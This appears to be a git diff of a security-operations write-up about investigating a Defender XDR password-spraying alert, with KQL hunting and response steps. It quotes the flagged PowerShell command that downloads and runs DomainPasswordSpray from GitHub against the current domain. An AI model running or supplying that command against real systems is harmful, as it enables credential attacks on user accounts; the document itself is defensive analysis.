@@ -12,7 +12,9 @@ I opened the Incidents & alerts blade, set the time range to 6 months, and locat
 
 Within the alert list, I selected the "Password spraying" alert to begin the investigation. Its details showed: Category — Credential access, MITRE ATT&CK Technique — T1110 (Brute Force), Detection source — EDR, Severity — Medium.
 
-[SCREENSHOT: Incidents queue showing the flagged multi-alert incident with Lateral Movement and Attack Disruption tags]
+![step1](https://github.com/ilolokerry/Azure-Cloud-SOC-Microsoft-Sentinel-Defender-XDR-/blob/ff9bacf2581ac7a1562170fb6552630cc557a8ab/part2-defender-xdr-detection-and-investigation/Media/xdr-credential%20acess/step1.png)
+
+![step1.1](https://github.com/ilolokerry/Azure-Cloud-SOC-Microsoft-Sentinel-Defender-XDR-/blob/ff9bacf2581ac7a1562170fb6552630cc557a8ab/part2-defender-xdr-detection-and-investigation/Media/xdr-credential%20acess/step1.1.png)
 
 ### Step 2: Review the Alert Timeline and Script Content
 
@@ -23,7 +25,7 @@ Switching to the Alert timeline surfaced the flagged event: `powershell.exe` exe
 IEX (IWR 'https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/94cb72506b9e2768196c8b6a4b7af63cebc47d88/DomainPasswordSpray.ps1' -UseBasicParsing); Invoke-DomainPasswordSpray -Password ********** -Domain $Env:USERDOMAIN -Force}
 ```
 
-[SCREENSHOT: Alert timeline showing the powershell.exe executed a script event with AMSI content]
+![step2](https://github.com/ilolokerry/Azure-Cloud-SOC-Microsoft-Sentinel-Defender-XDR-/blob/ff9bacf2581ac7a1562170fb6552630cc557a8ab/part2-defender-xdr-detection-and-investigation/Media/xdr-credential%20acess/step%202.png)
 
 This script forces the TLS 1.2 protocol, then uses `IEX`/`IWR` to download and execute DomainPasswordSpray — a known, publicly available password spraying tool — directly from GitHub, and immediately invokes it against the current domain with a supplied password. This is the same fileless, in-memory execution pattern seen in the earlier Execution investigation, applied here toward credential access instead of a generic post-exploitation payload.
 
@@ -46,7 +48,7 @@ Based on the investigation, this alert was confirmed malicious. Available respon
 - Initiate Live Response Session for manual remote intervention
 - Isolate Device to prevent lateral movement or further access to other devices
 
-[SCREENSHOT: Device action menu showing response options including Isolate Device]
+![step4](https://github.com/ilolokerry/Azure-Cloud-SOC-Microsoft-Sentinel-Defender-XDR-/blob/ff9bacf2581ac7a1562170fb6552630cc557a8ab/part2-defender-xdr-detection-and-investigation/Media/xdr-credential%20acess/step4.png)
 
 ### Step 5: Advanced Hunting
 
@@ -66,7 +68,7 @@ and (DeviceName == deviceName
 
 This query searches across multiple device event tables for the top 100 events tied to the affected machine over the last 7 days, giving a broader activity timeline beyond just the flagged alert.
 
-[SCREENSHOT: Advanced Hunting query results with timeline visualization showing an activity spike]
+![step5](https://github.com/ilolokerry/Azure-Cloud-SOC-Microsoft-Sentinel-Defender-XDR-/blob/ff9bacf2581ac7a1562170fb6552630cc557a8ab/part2-defender-xdr-detection-and-investigation/Media/xdr-credential%20acess/step5.png)
 
 ## Key Takeaways
 
